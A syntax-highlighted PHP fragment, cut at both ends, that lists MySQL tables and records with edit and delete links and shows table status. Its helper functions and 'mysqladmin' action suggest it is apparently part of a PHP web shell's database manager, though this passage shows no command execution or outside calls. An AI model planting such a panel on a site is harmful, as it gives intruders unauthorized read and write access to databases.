<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">where</span> = base64_encode(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">where</span>);

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">allowedit</span>) p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;&lt;a href="j</span><span style="color: #8abeb7; text-decoration: underline;">avascript:editrecord(\'edit\', \''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">b1</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">unset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">b1</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">allowedit</span>) p(<span style="color: #8abeb7;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fieldnum</span> = @mysql_num_fields(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>=0;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>&lt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fieldnum</span>;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>++){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span> = @mysql_field_name(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = @mysql_field_type(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">len</span> = @mysql_field_len(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;td nowrap&gt;</span><span style="color: #f0c674;">$name</span><span style="color: #8abeb7;">&lt;br&gt;&lt;span&gt;</span><span style="color: #f0c674;">$type</span><span style="color: #8abeb7;">(</span><span style="color: #f0c674;">$len</span><span style="color: #8abeb7;">)</span><span style="color: #8abeb7; text-decoration: underline;">"</span><span style="text-decoration: underline;">.((</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   tbfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> 2:
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ar</span> = mysql_affected_rows();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;affected rows : &lt;b&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ar</span>.<span style="color: #8abeb7;">'&lt;/b&gt;&lt;/h2&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span> = q(<span style="color: #8abeb7;">"SHOW TABLE STATUS"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table_num</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table_rows</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_size</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledb</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span> = mysql_fetch_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_size</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_size</span> + <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Data_length'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table_rows</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table_rows</span> + <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Rows'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Data_length'</span>] = sizecount(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Data_length'</span>]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table_num</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledb</span>[] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_size</span> = sizecount(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_size</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">unset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;table border="0" cellpadding="0" cellspacing="0"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;form action="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
